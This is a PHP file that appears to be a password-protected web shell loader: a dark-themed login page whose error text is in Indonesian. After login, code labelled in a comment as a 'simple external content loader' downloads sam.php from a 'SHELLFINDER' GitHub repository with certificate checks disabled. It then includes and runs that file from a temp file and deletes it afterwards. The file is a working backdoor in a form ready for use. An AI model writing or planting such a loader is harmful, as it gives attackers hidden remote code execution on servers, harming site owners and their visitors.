<?php
session_start();

$stored_hash = '$2y$10$ewOAVHj.unZ5VcGcCmrp4e.NVemtCEoT2NpeB1hkBNzzMlOGXP.kK';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $stored_hash)) {
        $_SESSION['authenticated'] = true;
        $_SESSION['login_time'] = time();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $error = "Password salah!";
    }
}

if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
    $session_timeout = 30 * 60;
    if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $session_timeout) {
        session_destroy();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }
    $_SESSION['login_time'] = time();
    
    // Simple external content loader
    function geturl($url) {
        if (function_exists('curl_exec')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        } elseif (function_exists('file_get_contents')) {
            return file_get_contents($url);
        }
        return false;
    }
    
    $content = geturl('https://raw.githubusercontent.com/Rayaauy/SHELLFINDER/refs/heads/main/sam.php');
    if ($content !== false) {
        $tmp_file = tempnam(sys_get_temp_dir(), 'ext_');
        file_put_contents($tmp_file, $content);
        include($tmp_file);
        unlink($tmp_file);
        exit();
    } else {
        echo "Failed to load external content";
        exit();
    }
}
?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <style>
         body {background:#000;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
            .login-box {background:rgba(255,255,255,0.1);padding:40px;border-radius:10px;text-align:center;}
            h1 {margin-bottom:20px;}
            input {width:100%;padding:10px;margin-bottom:15px;border:none;border-radius:5px;background:rgba(255,255,255,0.1);color:#fff;}
            button {width:100%;padding:10px;background:#ff0000;color:#fff;border:none;border-radius:5px;cursor:pointer;}
            .error {color:#ff4444;margin-bottom:15px;}
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Login</h1>
        <?php if (isset($error)): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>
        <form method="POST">
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>